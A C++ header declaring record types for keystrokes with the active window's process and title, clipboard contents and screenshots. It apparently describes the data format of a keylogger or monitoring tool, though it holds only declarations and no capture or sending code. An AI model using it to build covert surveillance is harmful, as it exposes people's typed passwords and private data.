#ifndef LRCDATA_LRCDATATYPES
#define LRCDATA_LRCDATATYPES
#define LRCDATA_KEYBOARD_SUBTYPE_VKINFO 0x1
#define LRCDATA_KEYBOARD_SUBTYPE_WNDINFO 0x2
#define LRCDATA_HEADER_SIZE 0x48
#include "binpptypes.hpp"
#include <vector>
#include <string>
#include <cstdint>

namespace lrcdata
{
	typedef std::vector<byte> ByteVector;

	enum Type
	{
		keyboard = 0x1,
		clipboard = 0x2,
		screenshot = 0x3
	};

	struct Header
	{
		uint16_t signature;
		uint8_t version;
		char id[65];
		uint8_t type;
		uint32_t length;
	};

	struct VKInfo
	{
		uint32_t keyCode;
		uint16_t lang;
		uint8_t flags;
	};

	struct WNDInfo
	{
		uint32_t time;
		std::wstring processName;
		std::wstring title;
	};

	struct PartKeyboard
	{
		uint8_t subtype;
		VKInfo vkInfo;
		WNDInfo wndInfo;
	};

	struct PartClipboard
	{
		WNDInfo wndInfo;
		std::wstring data;
	};
}

#endif // !LRCDATA_LRCDATATYPES
